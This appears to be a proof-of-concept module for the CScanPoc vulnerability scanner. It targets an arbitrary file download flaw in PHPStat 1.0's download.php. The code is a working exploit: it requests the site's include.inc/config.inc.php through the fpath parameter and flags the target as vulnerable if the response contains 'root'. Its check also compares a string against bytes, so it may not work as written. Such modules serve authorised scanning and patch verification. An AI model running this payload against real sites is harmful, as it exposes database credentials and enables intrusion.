# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'PHPStat_0001'  # 平台漏洞编号，留空
    name = 'PHPStat 1.0 /download.php 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-11-13'  # 漏洞公布时间
    desc = '''
        PHPStat 网站流量统计,是通过统计网站访问者的访问来源、访问时间、访问内容等访问信息,加以系统分析,进而总结出访问者访问来源、爱好趋向、访问习惯等一些共性数据，为网站进一步调整做出指引的一门新型用户行为分析技术。
        PHPStat v1.0.20141124 /download.php 任意文件下载。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2372/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPStat'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9d33ba00-2b14-489a-932e-35d2655afdec'
    author = '国光'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/download.php?fname=1.txt&fpath=./include.inc/config.inc.php'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if 'root' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
